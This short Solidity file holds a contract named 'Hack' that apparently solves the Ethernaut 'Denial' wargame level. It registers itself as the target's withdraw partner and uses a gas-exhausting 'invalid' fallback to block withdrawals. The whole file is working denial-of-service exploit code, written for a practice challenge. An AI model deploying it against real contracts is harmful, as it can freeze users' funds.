// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
  constructor(IDenial target) {
    target.setWithdrawPartner(address(this));
    target.withdraw();
  }

  fallback() external payable {
    assembly {
      invalid()
    }
  }
}

interface IDenial {
  function setWithdrawPartner(address _partner) external;
  function withdraw() external;
}
